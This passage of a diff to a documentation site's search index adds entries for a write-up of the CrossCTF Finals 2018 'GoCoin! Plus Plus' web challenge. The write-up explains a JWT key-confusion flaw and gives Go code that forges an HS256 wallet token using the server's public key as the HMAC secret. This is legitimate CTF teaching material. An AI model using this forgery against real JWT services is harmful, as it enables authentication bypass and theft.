KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyg+EcZOSLYXqdA0Gdx6hE0PFY\nGshbSxHwBbZ0Ivw41OCD447WtiTmBKWhYkyZIW1uF2G0YpifP9CGZgIHhW6jPUwB\nu1ewHy0ch+GQeMleaVGqEOsAd65DAXi2TSCZLl66zWy0enQ/SFkm9OTTGYR0e0hM\nDFqKsA30lPd0pHbSNwIDAQAB\n-----END PUBLIC KEY-----\n` // This newline is important\ntokenString, err := Wallet(10000, 10000, []byte(myKey))\nfmt.Println(err, tokenString)\n_, _, err := ParseWallet(tokenString, myKey)\nfmt.Println(err)\n\n\n\n\nHere's the full code\n.", 
+            "title": "GoCoin! Plus Plus"
+        }, 
+        {
+            "location": "/crossctf-finals2018/web/gocoinplusplus/README/#crossctf-finals-2018-gocoin-plus-plus-web", 
+            "text": "I thought blockchain was cool, so I made my own coin.  GoCoin! Plus Plus is the forked and improved version of GoCoin! Plus.  Update: I've improved it! More secures and with real cryptos, it's a true cryptocoin now! Update: Stupid me wrote a broken challenge, now its really fixed!  http://ctf.pwn.sg:1389", 
+            "title": "CrossCTF Finals 2018: GoCoin! Plus Plus (web)"
+        }, 
+        {
+            "location": "/crossctf-finals2018/web/gocoinplusplus/README/#challenge", 
+            "text": "So this is the real challenge, fixed by the organisers. TL; DR:   54c54    walletString := this.Ctx.GetCookie( wallet )\n---    walletString := this.Ctx.GetCookie( wallet_2 )\n...\n92c92    if err != nil {\n---    if err != nil || amount   0 {\n...\n141c141    if err != nil {\n---    if err != nil || amount   0 {\n...  So this makes the previous exploit unexploitable. Time to look back at the JWT implementation.   My familiarity with Go made the  code  2x easier to read.   Because of the hints about crypto being used, it pointed us pretty clearly at the JWT code. If you didn't know yet, JWS stands for JSON Web Tokens. It's a authorization token that can contain data, and makes token validation stateless other than validation of the signature attached using PKI.  It was pretty well-know that JWT had an issue previously where things with  alg: none . It's even stated in a banner on the JWT website. So, I took a look at the  ParseWallet  function.  func ParseWallet(myToken string, myKey []byte) (float64, float64, error) {\n    token, err := jwt.Parse(myToken, func(token *jwt.Token) (interface{}, error) {\n        if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {\n            key, err := jwt.ParseRSAPublicKeyFromPEM(myKey)\n            return key, err\n        }\n        return myKey, nil\n    })\n    if err == nil   token.Valid {\n...  From this chunk of code, you can see that the program checks for tokens that are  not  HMAC and then parses the PEM public key. But, if the token is a HMAC, it directly returns the key! This is especially obvious if you compare it to the  example code for HMAC  in the documentation for  github.com/dgrijalva/jwt-go , and  notices  in the project README.   Since the plaintext public key is being used to perform HMAC comparison rather than validating RSA signatures, we can forge our own tokens because we know the HMAC secret, which is the  []byte  publicKey.   So let's write a program to create this HMACed instead of RSAed token. Oh wait, it's already written by the challenge author! Just need to change one tiny bit.   token := jwt.New(jwt.GetSigningMethod( HS256 ))  Then now I can do:  myKey := `-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyg+EcZOSLYXqdA0Gdx6hE0PFY\nGshbSxHwBbZ0Ivw41OCD447WtiTmBKWhYkyZIW1uF2G0YpifP9CGZgIHhW6jPUwB\nu1ewHy0ch+GQeMleaVGqEOsAd65DAXi2TSCZLl66zWy0enQ/SFkm9OTTGYR0e0hM\nDFqKsA30lPd0pHbSNwIDAQAB\n-----END PUBLIC KEY-----\n` // This newline is important\ntokenString, err := Wallet(10000, 10000, []byte(myKey))\nfmt.Println(err, tokenString)\n_, _, err := ParseWallet(tokenString, myKey)\nfmt.Println(err)  Here's the full code .", 
+            "title": "Challenge"
         }, 
         {
             "location": "/crossctf-finals2018/crypto/fitblips/README/", 
